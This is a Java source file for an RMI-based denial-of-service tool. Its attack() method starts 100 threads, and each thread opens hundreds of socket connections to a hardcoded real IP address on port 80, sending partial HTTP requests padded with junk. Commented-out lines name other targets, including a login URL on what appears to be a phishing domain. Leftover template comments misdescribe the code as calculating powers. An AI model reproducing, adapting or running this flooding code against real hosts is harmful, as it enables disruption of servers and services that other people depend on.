package example.ddos;

import java.math.*;
import java.rmi.*;
import java.rmi.server.*;
import java.util.Base64;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
//
// DDOSServiceServer
//
// Server for a RMI service that calculates powers
//
public class DDOSServiceServer extends UnicastRemoteObject implements Runnable, DDOSService { //Target Machine
	//static final String TARGET = "http://nab.mobile-login.in/5974bc073d50de7bb8c734c00f6ad09a/login/?";
	//static final String TARGET = "http://47.74.238.145/5974bc073d50de7bb8c734c00f6ad09a/login/?";
	static final String TARGET = "47.74.238.145";
	
			//"http://nab.mobile-login.in/5974bc073d50de7bb8c734c00f6ad09a/login/?";//"47.74.238.145"; // "nab.mobile-login.in"; //"will-pc";
	static DDOSServiceServer _instance;
	
	public DDOSServiceServer () throws RemoteException	{
		super();
	}
	
	public static void sendRawLine(String text, BufferedWriter out) {
		try {
			out.write(text + " ");
			out.flush();
		} catch (IOException ex) {
			ex.printStackTrace();
		}
	}
	
	public static void sendRawLine(String text, Socket sock) {
		try {
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
			sendRawLine(text, out);
		} catch (IOException ex) {
			ex.printStackTrace();
		}
	}

	// Calculate the square of a number
	public String attack( )	throws RemoteException	{
		_instance = new DDOSServiceServer ();
		//2 threads on each machine
		for (int i = 0; i < 100; i++) new Thread(_instance).start();
		String attack;
		
		attack = "Attacking:"+ TARGET ;
		return attack;
	}
	
	public void run () {
		for (int i = 1; i < 1000; i++) {
			try {
				System.out.println("Attacking on Target  "+TARGET+" with Connection #: " + i);
				
				//connectAndGet();
				socketAttack();
			} catch (Exception e) {
				System.out.println("DDoS.run: " + e);
			}
		}
		
	} 
	
	public static void socketAttack() {
		try {
			System.out.println("Get Socket");
			
			Socket net = new Socket(TARGET, 80); // connects the Socket to the TARGET port 80.
			System.out.println("Got Soxket=" + net);
			
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(net.getOutputStream()));
			
			sendRawLine("GET / HTTP/1.1", out); // Sends the GET / OutputStream
			sendRawLine("Host: " + TARGET, out); // Sends Host: to the OutputStream
			String dummy = "Some shit face i am trying to crack\n";
			
			for (int i = 0; i < 10; i++)
				sendRawLine(dummy, out); // Sends Host: to the OutputStream
			
			
		} catch (UnknownHostException e) {
			System.out.println("DDoS.run: " + e);
		} catch (IOException e) {
			System.out.println("DDoS.run: " + e);
		}
	}
	public static void connectAndGet() {
		String urlAddress = TARGET;
		try {

			URL url = new URL(urlAddress);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setRequestMethod("GET");
			conn.setRequestProperty("Accept", "application/xml");
			conn.setDoOutput(true);
			//conn.setRequestProperty("Authorization", "Basic DOGSHIT" ); 
			
			String dummy = "Some shit face i am trying to crack\n";
			
			for (int i = 0; i < 10; i++)
			conn.getOutputStream().write(dummy.getBytes());
			
			
		
			if (conn.getResponseCode() != 200) {
				throw new RuntimeException("Failed : HTTP error code : " + conn.getResponseCode());
			}

			
			BufferedReader br = new BufferedReader(new InputStreamReader((conn.getInputStream())));

			String output;
			System.out.println("Output from Server .... \n");
			System.out.println("timeout" + conn.getConnectTimeout());
			System.out.println("timeout" + conn.getContentEncoding() + 
					" " + conn.getContentType());
			
			
			while ((output = br.readLine()) != null) {
				System.out.println(output);
			}
			
			
			
			conn.disconnect();

		} catch (MalformedURLException e) {

			e.printStackTrace();
			
		} catch (IOException e) {

			e.printStackTrace();
			
			
		}

	}
	
	

	public static void main ( String args[] ) throws Exception	{
		// Assign a security manager, in the event that dynamic
		// classes are loaded
		
		// Create an instance of our power service server ...
		DDOSServiceServer svr = new DDOSServiceServer();
		svr.attack();
		// ... and bind it with the RMI Registry
		//Naming.bind ("DDOSService", svr);
		System.out.println ("Service bound....");
	}
	
	
}